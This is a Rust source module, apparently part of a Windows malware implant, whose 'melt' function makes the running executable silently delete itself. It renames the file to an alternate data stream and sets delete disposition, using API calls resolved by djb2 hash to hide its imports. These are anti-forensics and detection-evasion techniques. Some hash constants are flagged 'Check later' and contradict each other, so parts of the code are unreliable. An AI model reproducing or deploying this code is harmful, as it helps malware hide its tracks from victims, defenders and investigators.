//! # Silent Self-Destruct
//!
//! Replaces noisy `cmd.exe /c del` with direct kernel manipulation.
//! Technique by Jonas Lykkegård.
//!
//! Steps:
//! 1. Rename file to Alternate Data Stream (ADS).
//! 2. Set delete disposition via SetFileInformationByHandle.
//! 3. Close handle -> OS deletes the file.

use super::api_resolver::{self, djb2, resolve_api, HASH_KERNEL32};
use core::ffi::c_void;
use core::ptr;

// API Hashes
const HASH_GET_MODULE_FILE_NAME_W: u32 = 0x56a2b5d0; // djb2(L"GetModuleFileNameW")? Check later
const HASH_CREATE_FILE_W: u32 = 0x52481e35; // Check
const HASH_SET_FILE_INFORMATION_BY_HANDLE: u32 = 0x228e9326; // Check

// We use hardcoded hashes verified from api_resolver or re-calculated here for safety
// Actually, let's use the ones from api_resolver if possible, or define new ones.

// djb2("SetFileInformationByHandle") = 0x228E9326
// Verified Hashes (djb2)
const HASH_SET_FILE_INFO: u32 = 0x01C5A2BC; // "SetFileInformationByHandle"
const HASH_GET_MOD_NAME_W: u32 = 0xE60575FF; // "GetModuleFileNameW"

#[repr(C)]
struct FileRenameInfo {
    replace_if_exists: u8,
    root_dir: *mut c_void,
    file_name_length: u32,
    file_name: [u16; 1],
}

#[repr(C)]
struct FileDispositionInfo {
    delete_file: u8,
}

const FILE_RENAME_INFO: u32 = 3;
const FILE_DISPOSITION_INFO: u32 = 4;
const DELETE: u32 = 0x00010000;
const SYNCHRONIZE: u32 = 0x00100000;
const FILE_SHARE_READ: u32 = 1;
const FILE_SHARE_DELETE: u32 = 4;
const OPEN_EXISTING: u32 = 3;

#[cfg(target_os = "windows")]
pub unsafe fn melt() -> Result<(), String> {
    crate::k::debug::log_detail!("SelfDelete: Init");

    // 1. Resolve APIs
    type GetModuleFileNameW = unsafe extern "system" fn(isize, *mut u16, u32) -> u32;
    type CreateFileW = unsafe extern "system" fn(*const u16, u32, u32, *const c_void, u32, u32, isize) -> isize;
    type SetFileInformationByHandle = unsafe extern "system" fn(isize, u32, *const c_void, u32) -> i32;
    type CloseHandle = unsafe extern "system" fn(isize) -> i32;

    let get_name: GetModuleFileNameW = resolve_api(HASH_KERNEL32, HASH_GET_MOD_NAME_W)
        .ok_or("E40:GetModuleFileNameW")?;
    let create_file: CreateFileW = resolve_api(HASH_KERNEL32, api_resolver::HASH_CREATE_FILE_W)
        .ok_or("E41:CreateFileW")?;
    let set_info: SetFileInformationByHandle = resolve_api(HASH_KERNEL32, HASH_SET_FILE_INFO)
        .ok_or("E42:SetFileInformationByHandle")?;
    let close_handle: CloseHandle = resolve_api(HASH_KERNEL32, api_resolver::HASH_CLOSE_HANDLE)
        .ok_or("E43:CloseHandle")?;

    // 2. Get own path
    let mut path = [0u16; 260];
    let len = get_name(0, path.as_mut_ptr(), 260);
    if len == 0 { return Err("E44".into()); }
    
    // Log path for debug
    // let p_str = String::from_utf16_lossy(&path[..len as usize]);
    // crate::k::debug::log_detail!("SelfDelete: Path found");

    // 3. Open handle with DELETE access
    let handle = create_file(
        path.as_ptr(),
        DELETE | SYNCHRONIZE,
        FILE_SHARE_READ | FILE_SHARE_DELETE,
        ptr::null(),
        OPEN_EXISTING,
        0,
        0
    );

    if handle == -1 { 
        crate::k::debug::log_err!("SelfDelete: Failed to open handle 1");
        return Err("E45".into()); 
    }

    // 4. Rename to ADS (Stream)
    // :Zone.Identifier
    let new_stream = [
        ':' as u16, 'Z' as u16, 'o' as u16, 'n' as u16, 'e' as u16, 
        '.' as u16, 'I' as u16, 'd' as u16, 'e' as u16, 'n' as u16, 
        't' as u16, 'i' as u16, 'f' as u16, 'i' as u16, 'e' as u16, 'r' as u16, 0
    ];
    
    let mut rename_info_buf = [0u8; 1024];
    let info = &mut *(rename_info_buf.as_mut_ptr() as *mut FileRenameInfo);
    
    info.replace_if_exists = 0;
    info.root_dir = ptr::null_mut();
    info.file_name_length = (new_stream.len() - 1) as u32 * 2;
    
    ptr::copy_nonoverlapping(
        new_stream.as_ptr(), 
        info.file_name.as_mut_ptr(), 
        new_stream.len() - 1
    );
    
    let status = set_info(
        handle,
        FILE_RENAME_INFO,
        info as *const _ as *const c_void,
        1024 
    );
    
    if status == 0 {
        close_handle(handle);
        crate::k::debug::log_err!("SelfDelete: Rename Failed (Is it locked?)");
        return Err("E46".into());
    }

    close_handle(handle);
    crate::k::debug::log_detail!("SelfDelete: Renamed to ADS");

    // 5. Re-open file and set Delete Disposition
    let handle2 = create_file(
        path.as_ptr(),
        DELETE | SYNCHRONIZE,
        FILE_SHARE_READ,
        ptr::null(),
        OPEN_EXISTING,
        0,
        0
    );

    if handle2 == -1 { return Err("E47:ReOpen".into()); }

    let mut disp_info = FileDispositionInfo { delete_file: 1 };
    
    let status2 = set_info(
        handle2,
        FILE_DISPOSITION_INFO,
        &mut disp_info as *mut _ as *const c_void,
        std::mem::size_of::<FileDispositionInfo>() as u32
    );

    close_handle(handle2);

    if status2 == 0 {
        return Err("E48:SetDisposition".into());
    }
    
    crate::k::debug::log_detail!("SelfDelete: Success");

    Ok(())
}

#[cfg(not(target_os = "windows"))]
pub unsafe fn melt() -> Result<(), String> { Ok(()) }

pub fn self_delete() {
    unsafe {
        if let Err(e) = melt() {
            crate::k::debug::log_err!(format!("SelfDelete Fail: {}", e));
        }
    }
}
